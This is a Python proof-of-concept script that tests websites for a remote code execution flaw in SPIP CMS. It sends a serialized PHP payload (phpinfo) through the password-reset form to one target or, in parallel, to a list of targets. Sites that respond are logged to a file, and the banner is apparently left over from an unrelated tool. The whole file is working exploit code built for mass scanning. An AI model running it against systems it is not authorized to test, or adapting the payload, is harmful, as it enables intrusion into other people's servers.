import requests,argparse,sys,time,re,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""

   _____ ____  ________  ________  ________      ____  ____________
  / ___// __ \/  _/ __ \/ ____/  |/  / ___/     / __ \/ ____/ ____/
  \__ \/ /_/ // // /_/ / /   / /|_/ /\__ \     / /_/ / /   / __/   
 ___/ / ____// // ____/ /___/ /  / /___/ /    / _, _/ /___/ /___   
/____/_/   /___/_/____\____/_/  /_//____/____/_/ |_|\____/_____/   
                /_____/                /_____/                     
                                                version:HX_ERP_sql 1.0
                                                author:hi6   
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='SPIP_CMS远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fb:
            for url in fb.readlines():
                url_list.append(url.strip())
        mp = Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/spip/spip.php?page=spip_pass'
    header={
        'User-Agent':'Mozilla/4.0(Mozilla/4.0;MSIE7.0;WindowsNT5.1;FDM;SV1;.NETCLR3.0.04506.30)',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'*/*',
        'Connection':'close',
        'Cookie':'cibcInit=oui',
        'Content-Length':'215',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data='page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    try:
        res = requests.post(url=target+payload,headers=header,proxies=proxies,data=data,timeout=15,verify=False)
        #print(res.status_code)
        if 200 == res.status_code and 'PHP Extension' in res.text and 'PHP Version' in res.text and '<!DOCTYPE html' in res.text:
            print(f'[+]{target} have loopholes {target+payload}')
            with open('result.txt','a',encoding='utf-8') as fn:
                fn.write(target.strip()+'\n')
        else:
             print(f'[-]{target}无漏洞')
    except:
        pass
if __name__ == "__main__":
    main()
